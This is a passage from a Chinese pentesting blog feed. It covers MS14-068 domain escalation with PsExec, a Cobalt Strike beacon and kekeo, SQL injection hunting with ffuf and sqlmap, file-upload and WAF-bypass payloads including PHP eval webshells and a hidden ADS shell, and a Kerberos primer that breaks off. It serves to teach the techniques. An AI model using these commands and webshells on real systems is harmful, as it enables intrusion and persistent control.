src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025184320851.png" alt="image-20221025184320851" style="zoom:50%;"><p>利用中转的监听，生成一个马子</p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025184447101.png" alt="image-20221025184447101" style="zoom:50%;"><p>将psexec和beacon上传到10.1.10.7，然后利用psexec的上传功能，上传到域控并执行</p><blockquote><p>通过ms14-068进行psexec，不能使用ip进行连接，否则会失败</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell PsExec.exe -accepteula \\win7,dc2 -d -c beacon.exe</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025183508322.png" alt="image-20221025183508322" style="zoom:50%;"><p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025185345300.png" alt="image-20221025185345300"></p><p>添加域管理员</p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025185323964.png" alt="image-20221025185323964" style="zoom:50%;"><ul><li>方法2</li></ul><p>使用cs自带的psexec</p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025190719505.png" alt="image-20221025190719505" style="zoom:50%;"><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025190756925.png" alt="image-20221025190756925" style="zoom:50%;"><p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025190923515.png" alt="image-20221025190923515"></p><h3 id="0x03-kekeo">0x03 kekeo</h3><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo <a href="https://github.com/gentilkiwi/kekeo">下载地址</a></p><p>使用之前需要先清除票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberse::purge</span><br></pre></td></tr></table></figure><p>然后直接使用 kekeo 生成高权限票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:fzm.cn /user:user1 /password:1qaz@WSX /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025192818100.png" alt="image-20221025192818100" style="zoom:50%;"><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025192906733.png" alt="image-20221025192906733" style="zoom:50%;"><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025193002396.png" alt="image-20221025193002396" style="zoom:50%;"><h3 id="0x04-GoldenPac">0x04 GoldenPac</h3><p>随缘写</p><h3 id="0x05-MSF">0x05 MSF</h3><p>随缘写</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS14-068 </tag>
            
            <tag> PTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何快速挖掘sql注入漏洞</title>
      <link href="/2022/10/24/dig_sql/"/>
      <url>/2022/10/24/dig_sql/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在一个平台上看到国外小哥的一篇文章，<a href="https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f">如何快速挖到sql注入漏洞</a></p><h3 id="0x01-思路">0x01 思路</h3><p>第一步，使用waybackurls工具爬去网页的所有链接，可以添加筛选的条件，uro是一个删除重复网址的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waybackurls https://redacted.org/ | uro | grep “.php” &gt; php-files.txt</span><br></pre></td></tr></table></figure><p>第二步，发现PHP文件名看起来很有趣，由get开头，尝试制作参数字典，进行一系列的处理</p><img src="/2022/10/24/dig_sql/image-20221024163646131.png" alt="image-20221024163646131" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | sort -u</span><br></pre></td></tr></table></figure><p>只需要 grep 包含<em>get</em>字符串的行并删除它之前的所有行并使其唯一以避免重复</p><img src="/2022/10/24/dig_sql/image-20221024163401237.png" alt="image-20221024163401237" style="zoom:50%;"><p>但我们应该删除 .php 字符串来创建一个列表，所以我只是将这一行添加到最后一个命令cut -f1 -d”.”</p><img src="/2022/10/24/dig_sql/image-20221024163551787.png" alt="image-20221024163551787" style="zoom:50%;"><p>我注意到我所有的字符串都包含两个单词，我不知道它们中的哪个是参数，所以让我们拆分它</p><p>如何在一行中找到大写字母，并拆分成行    sed ‘s/[AZ]+/\n&amp;/g’</p><img src="/2022/10/24/dig_sql/image-20221024163949891.png" alt="image-20221024163949891" style="zoom:50%;"><p>认为大多数参数都是小写的，而不是大写的，所以我将其保留为大写参数并将其转换为小写</p><img src="/2022/10/24/dig_sql/image-20221024164005355.png" alt="image-20221024164005355" style="zoom:50%;"><p>第三步，使用ffuf去fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -u &quot;https://redacted.org/searchProgressCommitment.php?FUZZ=5&quot;</span><br></pre></td></tr></table></figure><p>get 请求没结果，尝试转换post请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -X POST -d &quot;FUZZ=5&quot; -u &quot;https://redacted.org/searchProgressCommitment.php&quot;</span><br></pre></td></tr></table></figure><p>第四步，使用sqlmap去跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level 5 --&gt; Level of tests to perform.</span><br><span class="line">--risk 3 --&gt; Risk of tests to perform</span><br><span class="line">--dbms --&gt; back-end DBMS value</span><br><span class="line">--no-cast --&gt; to avoid use cast-alike statements during data fetching</span><br><span class="line">--tamper --&gt; to evade filters and WAF’s</span><br><span class="line">&quot;--hostname --current-user --current-db --dbs&quot; --&gt; to retrieve info about the database</span><br></pre></td></tr></table></figure><img src="/2022/10/24/dig_sql/image-20221024164202234.png" alt="image-20221024164202234" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于文件上传的一些总结</title>
      <link href="/2022/10/21/fileupload/"/>
      <url>/2022/10/21/fileupload/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>看到国外老哥利用文件上传绕过，获得2w美元的赏金，深感挫败。重新总结一下文件上传的知识点，顺便记录一下，以便以后的查找。老哥的文章：<a href="https://twitter.com/GodfatherOrwa/status/1582760830252511233%E3%80%82">https://twitter.com/GodfatherOrwa/status/1582760830252511233。</a></p><h3 id="0x01-文件上传校验姿势">0x01 文件上传校验姿势</h3><h4 id="客户端javascript校验">客户端javascript校验</h4><p>一般都是用javascript脚本检验上传文件的后缀。</p><h4 id="服务端校验">服务端校验</h4><ul><li><p>文件类型校验，其实就是文件头content-type字段校验（image/gif）</p></li><li><p>文件内容头校验（GIF89a）</p><p>主要是检测文件内容开始处的文件幻数</p></li><li><p>后缀名黑名单校验</p></li><li><p>后缀名白名单校验</p></li><li><p>自定义正则校验</p></li><li><p>WAF设备校验（根据不同的WAF产品而定）</p></li></ul><h3 id="0x02-文件上传绕过校验姿势">0x02 文件上传绕过校验姿势</h3><h4 id="客户端绕过">客户端绕过</h4><p>可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p><h4 id="服务端绕过">服务端绕过</h4><ul><li>文件类型绕过</li></ul><p>抓包改Content-type字段<br>比如通过抓包，将content-type字段改为image/gif</p><ul><li>文件内容头绕过</li></ul><p>在木马文件内容开头加上一些文件头信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.JPEG;.JPE;.JPG，”JPGGraphic File”</span><br><span class="line">.gif，”GIF 89A”</span><br><span class="line">.zip，”Zip Compressed”</span><br><span class="line">.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</span><br></pre></td></tr></table></figure><ul><li><p>文件名/后缀绕过</p><ul><li><p>截断</p><p>test.php%00.jpg</p><p>test.php0xoo.jpg</p><p>burp抓包，修改hex的值为00，也称00截断</p></li><li><p>windows特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ADS流：test.php::$DATA(见下)</span><br><span class="line">test.php.</span><br><span class="line">test.php_</span><br><span class="line">test.php(空格)</span><br><span class="line">*=.</span><br><span class="line">&lt;=*</span><br><span class="line">&gt;=?</span><br><span class="line">test.&lt;&lt;&lt;</span><br><span class="line">test.php:1.jpg会生成一个test.php的空文件</span><br></pre></td></tr></table></figure></li><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞:</span><br><span class="line">.asp;.jpg</span><br><span class="line">.asp.jpg</span><br><span class="line">.asp;jpg</span><br><span class="line">+111.asp;+222.jpg</span><br><span class="line">/111.asp/1.jpg</span><br><span class="line">/111.aspx/1.jpg</span><br><span class="line">后缀名：</span><br><span class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</span><br><span class="line">双文件扩展：</span><br><span class="line">test.asp.jpg</span><br><span class="line">RTLO：</span><br><span class="line">asp.html-内容为一句话</span><br><span class="line">php.txt-内容为一句话</span><br></pre></td></tr></table></figure></li><li><p>JSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.jsp.jpg.jsp-用两个jsp包围中间的jpg</span><br><span class="line">后缀名：jspf,jspa,jsps</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">后缀名：.php3 ,.php5,.php7</span><br><span class="line">大小写：pHp</span><br><span class="line">解析漏洞：</span><br><span class="line">1.php.jpg</span><br><span class="line">1.jpg.php</span><br><span class="line">1.php  jpg(jpg前面两个空格)</span><br><span class="line">1.php jpg(jpg前面一个空格)</span><br><span class="line">/1.jpg/1.php</span><br><span class="line">/1.jpg%00.php</span><br><span class="line">/1.jpg/.php</span><br><span class="line">/1.jpg/php</span><br><span class="line">特殊文件利用：</span><br><span class="line">.htaccess</span><br><span class="line">.user.ini</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="配合文件包含漏洞">配合文件包含漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt</span><br><span class="line">b.利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt</span><br></pre></td></tr></table></figure><h4 id="配合服务器解析漏洞">配合服务器解析漏洞</h4><ul><li><p>IIS 5.x/6.0解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IIS5.x-6.x:</span><br><span class="line">1、目录解析(6.0):/1.asp/1.jpg 在此目录下的任意文件，服务器都解析为asp文件</span><br><span class="line">2、文件解析:1.asp;.jpg</span><br><span class="line">3、文件类型:1.asa,a.cer,1.cdx</span><br><span class="line"></span><br><span class="line">IIS7.5：</span><br><span class="line">IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf</span><br></pre></td></tr></table></figure></li><li><p>Apache解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</span><br><span class="line">后缀不识别：1.php.php123</span><br><span class="line">配置错误：1.php.jpg</span><br></pre></td></tr></table></figure></li><li><p>Nginx解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</span><br><span class="line">1.jpg/1.php</span><br><span class="line">1.jpg%00.php</span><br><span class="line">1.jpg/%20\1.php</span><br><span class="line">上传一个名字为test.jpg，以下内容的文件</span><br><span class="line">‘);?&gt;</span><br><span class="line">然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</span><br></pre></td></tr></table></figure></li></ul><h4 id="配合操作系统文件命令规则">配合操作系统文件命令规则</h4><ul><li><p>上传不符合windows文件命名规则的文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">shell.php::$DATA…….</span><br><span class="line">会被windows系统自动去掉不符合规则符号后面的内容。</span><br></pre></td></tr></table></figure></li><li><p>linux下后缀名大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</span><br></pre></td></tr></table></figure></li></ul><h4 id="CMS、编辑器漏洞">CMS、编辑器漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。</span><br><span class="line">编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</span><br></pre></td></tr></table></figure><h4 id="其他规则">其他规则</h4><ul><li><p>利用WAF特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在恶意代码前加垃圾数据；</span><br><span class="line">在数据包前加垃圾数据；</span><br><span class="line">在Content-Disposition参数后面加垃圾数据；</span><br><span class="line">多加一个filename；</span><br><span class="line">更改HTTP请求方法；</span><br><span class="line">删除实体里面的Conten-Type字段；</span><br><span class="line">第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</span><br><span class="line">删除Content-Disposition字段里的空格</span><br><span class="line">增加一个空格</span><br><span class="line">修改Content-Disposition字段值的大小写</span><br><span class="line">文件名后缀处回车</span><br><span class="line">多个Content-Disposition</span><br></pre></td></tr></table></figure></li><li><p>利用NTFS ADS特性</p><p>DS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.php:a.jpg　　　　　　　　　生成test.php  空</span><br><span class="line">test.php::$INDEX_ALLOCATION  生成test.php文件夹  </span><br><span class="line">test.php::$DATA\1.jpg  　　　生成1.jpg(不可见的)</span><br><span class="line">echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg</span><br><span class="line">这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了</span><br></pre></td></tr></table></figure></li><li><p>利用RTLO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">新建一个文件php.html</span><br><span class="line">内容为：&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line">重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO</span><br><span class="line">这个时候php.html已经变成了html.php了</span><br></pre></td></tr></table></figure></li><li><p>特殊的长文件名绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件名使用非字母数字，比如中文等最大程度的拉长</span><br><span class="line">shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br></pre></td></tr></table></figure></li><li><p>反删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将name=”file1”改成了file4，可以防止文件删除（JCMS漏洞）</span><br></pre></td></tr></table></figure></li><li><p>图片转换/二次渲染/文件幻数检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释</span><br><span class="line">溢出攻击</span><br><span class="line">绕过GD库</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x03-WAF-Bypass">0x03 WAF Bypass</h3><p>WAF如何拦截？</p><ul><li>解析文件名，判断是否在黑名单内。</li><li>解析文件内容，判断是否为webshell。</li><li>文件目录权限</li></ul><p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。</p><h4 id="垃圾数据">垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p><ul><li><p>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验</p><img src="/2022/10/21/fileupload/image-20221021152925545.png" alt="image-20221021152925545" style="zoom:50%;"></li><li><p>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验</p><img src="/2022/10/21/fileupload/image-20221021153052502.png" alt="image-20221021153052502" style="zoom:50%;"></li><li><p>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错</p></li></ul><h4 id="多个filename">多个filename</h4><p>早期版本安全狗，可以多加一个filename</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p><h4 id="交换name和filename的顺序">交换name和filename的顺序</h4><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure><h4 id="去掉引号-双引号变成单引号">去掉引号,双引号变成单引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><p>单引号、双引号、不要引号，都能上传。</p><h4 id="大小写">大小写</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">对这三个固定的字符串进行大小写转换</span><br><span class="line"></span><br><span class="line">Content-Disposition</span><br><span class="line">name</span><br><span class="line">filename</span><br><span class="line"></span><br><span class="line">空格</span><br><span class="line">在: ; =添加1个或者多个空格。</span><br></pre></td></tr></table></figure><h4 id="去掉或修改Content-Disposition值">去掉或修改Content-Disposition值</h4><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><h4 id="多个boundary">多个boundary</h4><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/javascript</span><br></pre></td></tr></table></figure><h4 id="多个分号">多个分号</h4><p>文件解析时，可能解析不到文件名，导致绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h4 id="Header在boundary前添加任意字符">Header在boundary前添加任意字符</h4><p>PHP支持，JAVA报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure><h4 id="filename换行">filename换行</h4><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h4 id="name和filename添加任意字符串">name和filename添加任意字符串</h4><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure><h4 id="POST-GET">POST/GET</h4><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解kerberos认证原理</title>
      <link href="/2022/10/19/kerberos/"/>
      <url>/2022/10/19/kerberos/</url>
      
        <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>Kerberos协议是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，kerberos侧重于通信前双方身份的认定工作，帮助客户端和服务端解决“证明我自己是我自己”的问题，从而使得通信两端能够完全信任对方身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。</p><h3 id="什么是Kerberos协议">什么是Kerberos协议</h3><p>kerberos是一种计算机网络认证协议，他能够为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。不同于其他网络服务，kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能够建立连接然后进行加密通信。而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。即kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。本文将详细概述kerberos认证原理，讲述通信双方是如何一步步确认对方身份完成认证的。</p><h3 id="Kerberos协议的组成角色">Kerberos协议的组成角色</h3><p>在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡灵，防止活着的入侵者闯入地狱。而真正的kerberos协议中也存在三个角色，分别是</p><ul><li><strong>客户端（client）</strong>：发送请求的一方</li><li><strong>服务端（Server）</strong>：接收请求的一方</li><li>密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：<ul><li><strong>AS（Authentication Server）</strong>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</li><li><strong>TGS（Ticket Granting Server）</strong>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（ST）</li></ul></li></ul><p>在整个kerberos认证过程中，三个角色缺一不可，下面便来介绍一下整个kerberos的认证原理</p><h3 id="Kerberos认证解决”如何证明我就是我的问题“">Kerberos认证解决”如何证明我就是我的问题“</h3><p>上面说到了kerberos协议当中总共有三个不同的角色，客户端和服务端就不用多说了，一个是请求的发起者一个是请求的接收者，那么KDC是做什么的呢？答案是这样的~<br>在kerberos协议中，通信的双方在通信之前必须相互证明自己的身份是可靠并且具有访问权限的（后面会说为什么是要具有访问权限的），那么双方都要如何证明自己呢？口说无凭，客户端的请求中携带自己的身份信息直接给服务端，服务端是没有理由直接信任这段信息就是真实的信息的，同理，服务端返回自己的身份信息给客户端，客户端也同样是无法辨别该服务器是否是自己想要访问的服务器。</p><p>举个例子，A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如果A直接去找B告诉B我就是A，那么B是有理由不相信A的，因为即使A是一个冒充的他也分辨不清，B同理也得不到A的认可，他们陷入了一个无<br>法证明我就是我的困境。于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B，所以只要C告诉B，这个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找C，便可以得到C的确认了。</p><p>在上面的例子中，A，B分别是客户端和服务端，C担任的角色便是<strong>KDC</strong>，全称Key Distribution 